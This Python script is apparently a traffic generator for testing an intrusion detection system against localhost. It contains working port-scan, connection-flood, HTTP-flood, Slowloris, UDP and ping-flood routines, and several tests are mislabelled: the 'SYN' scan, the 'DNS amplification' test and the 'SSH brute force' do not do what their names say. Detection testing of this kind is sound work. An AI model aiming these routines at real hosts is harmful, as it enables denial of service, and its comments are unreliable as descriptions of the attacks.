# advanced_attack_tester.py
"""
COMPLETE ATTACK TESTING SUITE - Tests all attack types with variations
Run this against your IDS to verify detection
"""

import socket
import threading
import time
import random
import struct
import subprocess
import sys
from datetime import datetime
import os

class AttackTester:
    def __init__(self, target_ip="127.0.0.1"):
        self.target_ip = target_ip
        self.target_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 
                             993, 995, 1723, 3306, 3389, 5900, 8080, 8443]
        self.results = []
        
    def print_banner(self, test_name):
        """Print test banner"""
        print("\n" + "=" * 70)
        print(f"🔥 TESTING: {test_name}")
        print("=" * 70)

    def test_1_stealth_port_scan(self):
        """Test 1: Stealth Port Scan - SYN scan"""
        self.print_banner("Stealth Port Scan (SYN)")
        
        print(f"Scanning {len(self.target_ports)} common ports...")
        open_ports = []
        
        for port in self.target_ports:
            try:
                # Create SYN packet (stealth scan)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((self.target_ip, port))
                if result == 0:
                    open_ports.append(port)
                    print(f"  ✅ Port {port}: OPEN")
                sock.close()
            except:
                pass
            time.sleep(0.01)
        
        print(f"\n✅ Found {len(open_ports)} open ports: {open_ports}")
        return len(open_ports)

    def test_2_massive_port_scan(self):
        """Test 2: Massive port scan - 1000 ports rapidly"""
        self.print_banner("Massive Port Scan (1000 ports)")
        
        print("Scanning ports 1-1000 rapidly...")
        scan_rate = 0
        start_time = time.time()
        
        for port in range(1, 1001):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.01)
                sock.connect_ex((self.target_ip, port))
                sock.close()
            except:
                pass
            
            if port % 100 == 0:
                elapsed = time.time() - start_time
                rate = port / elapsed if elapsed > 0 else 0
                print(f"  Scanned {port} ports | Rate: {rate:.0f} ports/sec")
        
        print(f"✅ Complete! Scan rate: {1000/(time.time()-start_time):.0f} ports/sec")

    def test_3_syn_flood(self):
        """Test 3: SYN Flood Attack - High rate connections"""
        self.print_banner("SYN Flood Attack")
        
        def flood():
            sent = 0
            start = time.time()
            while time.time() - start < 5:  # Run for 5 seconds
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.001)
                    sock.connect_ex((self.target_ip, random.choice([80, 443, 8080])))
                    sock.close()
                    sent += 1
                except:
                    pass
            return sent
        
        # Launch 10 threads
        threads = []
        for i in range(10):
            t = threading.Thread(target=flood)
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        
        print("✅ SYN Flood complete - High rate connections sent")

    def test_4_http_flood(self):
        """Test 4: HTTP Flood - Application layer DDoS"""
        self.print_banner("HTTP Flood Attack")
        
        def http_flood():
            sent = 0
            for i in range(100):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((self.target_ip, 80))
                    
                    # Random HTTP request
                    paths = ['/', '/index.html', '/login', '/api', '/admin']
                    path = random.choice(paths)
                    
                    request = f"GET {path} HTTP/1.1\r\n"
                    request += f"Host: {self.target_ip}\r\n"
                    request += "User-Agent: Mozilla/5.0\r\n"
                    request += "Connection: close\r\n"
                    request += "\r\n"
                    
                    sock.send(request.encode())
                    sock.close()
                    sent += 1
                except:
                    pass
            return sent
        
        threads = []
        for i in range(20):
            t = threading.Thread(target=http_flood)
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        
        print("✅ HTTP Flood complete - 2000+ requests sent")

    def test_5_bruteforce_ssh(self):
        """Test 5: SSH Brute Force"""
        self.print_banner("SSH Brute Force Attack")
        
        usernames = ['root', 'admin', 'user', 'test', 'ubuntu', 'ec2-user']
        passwords = ['password', '123456', 'admin', 'root', 'qwerty', 'letmein']
        
        print(f"Attempting {len(usernames) * len(passwords)} login combinations...")
        
        for username in usernames[:3]:
            for password in passwords[:5]:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    sock.connect((self.target_ip, 22))
                    
                    # Send SSH banner
                    sock.send(b"SSH-2.0-Test\r\n")
                    time.sleep(0.05)
                    
                    # Send auth attempt
                    auth = f"{username}:{password}".encode()
                    sock.send(auth)
                    sock.close()
                    
                    print(f"  Attempt: {username}:{password}")
                except:
                    pass
                time.sleep(0.01)
        
        print("✅ SSH Brute Force complete")

    def test_6_dns_amplification(self):
        """Test 6: DNS Amplification Attack Simulation"""
        self.print_banner("DNS Amplification Attack")
        
        # Create a large DNS query
        dns_query = b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
        dns_query += b'\x03www\x06google\x03com\x00\x00\x01\x00\x01'
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for i in range(100):
                sock.sendto(dns_query, (self.target_ip, 53))
                if i % 10 == 0:
                    print(f"  Sent {i} DNS queries")
                time.sleep(0.001)
            sock.close()
        except:
            print("  DNS amplification failed (port 53 may be closed)")
        
        print("✅ DNS test complete")

    def test_7_slowloris(self):
        """Test 7: Slowloris - Slow HTTP headers"""
        self.print_banner("Slowloris Attack")
        
        sockets = []
        
        # Open many connections and keep them alive
        for i in range(50):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target_ip, 80))
                
                # Send partial headers
                sock.send(b"GET / HTTP/1.1\r\n")
                sock.send(f"Host: {self.target_ip}\r\n".encode())
                sock.send(b"User-Agent: Mozilla/5.0\r\n")
                # Don't send final \r\n\r\n - keep open
                
                sockets.append(sock)
                
                if i % 10 == 0:
                    print(f"  {i} connections open")
                    
            except Exception as e:
                print(f"  Connection {i} failed: {e}")
        
        # Hold connections open
        if sockets:
            print(f"  Holding {len(sockets)} connections open for 10 seconds...")
            time.sleep(10)
            
            # Close connections
            for sock in sockets:
                sock.close()
        
        print("✅ Slowloris complete")

    def test_8_data_exfiltration(self):
        """Test 8: Data Exfiltration - Large data transfer"""
        self.print_banner("Data Exfiltration")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target_ip, 8080))
            
            # Send 1MB of data
            total = 0
            chunk = b"X" * 8192  # 8KB chunks
            
            for i in range(128):  # 1MB total
                sock.send(chunk)
                total += len(chunk)
                if i % 16 == 0:
                    print(f"  Sent {total/1024:.0f} KB...")
                time.sleep(0.001)
            
            sock.close()
            print(f"✅ Sent {total/1024:.0f} KB total")
            
        except Exception as e:
            print(f"  Exfiltration failed: {e}")

    def test_9_icmp_flood(self):
        """Test 9: ICMP Flood - Ping flood"""
        self.print_banner("ICMP Flood")
        
        # Use system ping for ICMP
        for i in range(50):
            try:
                if sys.platform == "win32":
                    subprocess.run(
                        ['ping', '-n', '1', '-l', '1000', '-w', '10', self.target_ip],
                        capture_output=True,
                        timeout=0.1
                    )
                else:
                    subprocess.run(
                        ['ping', '-c', '1', '-s', '1000', '-W', '1', self.target_ip],
                        capture_output=True,
                        timeout=0.1
                    )
                
                if i % 10 == 0:
                    print(f"  Sent {i} pings")
                    
            except:
                pass
        
        print("✅ ICMP flood complete")

    def test_10_udp_flood(self):
        """Test 10: UDP Flood"""
        self.print_banner("UDP Flood")
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = b"X" * 1024  # 1KB packets
        
        for i in range(100):
            try:
                sock.sendto(data, (self.target_ip, random.randint(10000, 20000)))
                if i % 10 == 0:
                    print(f"  Sent {i} UDP packets")
            except:
                pass
        
        sock.close()
        print("✅ UDP flood complete")

    def run_all_tests(self):
        """Run all attack tests"""
        print("\n" + "█" * 70)
        print("██  COMPLETE ATTACK TESTING SUITE")
        print("██  Target: " + self.target_ip)
        print("█" * 70)
        print("\n⚠️  Make sure your IDS is RUNNING!")
        print("⚠️  Press Ctrl+C between tests to stop\n")
        
        input("Press Enter to start Test 1: Stealth Port Scan...")
        self.test_1_stealth_port_scan()
        
        input("\nPress Enter to start Test 2: Massive Port Scan...")
        self.test_2_massive_port_scan()
        
        input("\nPress Enter to start Test 3: SYN Flood...")
        self.test_3_syn_flood()
        
        input("\nPress Enter to start Test 4: HTTP Flood...")
        self.test_4_http_flood()
        
        input("\nPress Enter to start Test 5: SSH Brute Force...")
        self.test_5_bruteforce_ssh()
        
        input("\nPress Enter to start Test 6: DNS Amplification...")
        self.test_6_dns_amplification()
        
        input("\nPress Enter to start Test 7: Slowloris...")
        self.test_7_slowloris()
        
        input("\nPress Enter to start Test 8: Data Exfiltration...")
        self.test_8_data_exfiltration()
        
        input("\nPress Enter to start Test 9: ICMP Flood...")
        self.test_9_icmp_flood()
        
        input("\nPress Enter to start Test 10: UDP Flood...")
        self.test_10_udp_flood()
        
        print("\n" + "=" * 70)
        print("✅ ALL TESTS COMPLETE")
        print("📊 Check your IDS dashboard for alerts with CONFIDENCE SCORES!")
        print("=" * 70)


class TestServer:
    """Test server to receive attacks"""
    
    def __init__(self):
        self.running = False
        self.servers = []
        
    def start(self):
        """Start multiple test servers"""
        self.running = True
        ports = [80, 443, 22, 21, 8080, 53, 3389]
        
        for port in ports:
            try:
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server.bind(('0.0.0.0', port))
                server.listen(5)
                self.servers.append((port, server))
                
                # Start thread for this server
                thread = threading.Thread(target=self._handle_server, args=(server, port))
                thread.daemon = True
                thread.start()
                
                print(f"✅ Test server listening on port {port}")
            except Exception as e:
                print(f"❌ Port {port}: {e}")
        
        print(f"\n🟢 {len(self.servers)} test servers running")
        
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()
    
    def _handle_server(self, server, port):
        """Handle incoming connections"""
        while self.running:
            try:
                client, addr = server.accept()
                client.close()  # Just accept and close
            except:
                pass
    
    def stop(self):
        """Stop all servers"""
        self.running = False
        for port, server in self.servers:
            server.close()
        print("🛑 Test servers stopped")


if __name__ == "__main__":
    import sys
    
    print("\n🔴 ADVANCED ATTACK TESTER")
    print("1. Run ALL attack tests")
    print("2. Start test servers (target)")
    print("3. Run quick test (30 seconds)")
    print("4. Run specific test")
    
    choice = input("\nChoose (1-4): ").strip()
    
    if choice == "1":
        tester = AttackTester("127.0.0.1")
        tester.run_all_tests()
        
    elif choice == "2":
        server = TestServer()
        server.start()
        
    elif choice == "3":
        print("\nRunning quick test suite (30 seconds)...")
        tester = AttackTester("127.0.0.1")
        
        # Run multiple attacks in parallel
        threads = [
            threading.Thread(target=tester.test_1_stealth_port_scan),
            threading.Thread(target=tester.test_2_massive_port_scan),
            threading.Thread(target=tester.test_3_syn_flood),
            threading.Thread(target=tester.test_4_http_flood),
        ]
        
        for t in threads:
            t.start()
        
        for t in threads:
            t.join(timeout=30)
        
        print("\n✅ Quick test complete!")
        
    elif choice == "4":
        tester = AttackTester("127.0.0.1")
        print("\nAvailable tests:")
        print("1. Stealth Port Scan")
        print("2. Massive Port Scan")
        print("3. SYN Flood")
        print("4. HTTP Flood")
        print("5. SSH Brute Force")
        print("6. DNS Amplification")
        print("7. Slowloris")
        print("8. Data Exfiltration")
        print("9. ICMP Flood")
        print("10. UDP Flood")
        
        test_choice = input("Choose test (1-10): ").strip()
        
        tests = {
            '1': tester.test_1_stealth_port_scan,
            '2': tester.test_2_massive_port_scan,
            '3': tester.test_3_syn_flood,
            '4': tester.test_4_http_flood,
            '5': tester.test_5_bruteforce_ssh,
            '6': tester.test_6_dns_amplification,
            '7': tester.test_7_slowloris,
            '8': tester.test_8_data_exfiltration,
            '9': tester.test_9_icmp_flood,
            '10': tester.test_10_udp_flood
        }
        
        if test_choice in tests:
            tests[test_choice]()
        else:
            print("Invalid choice")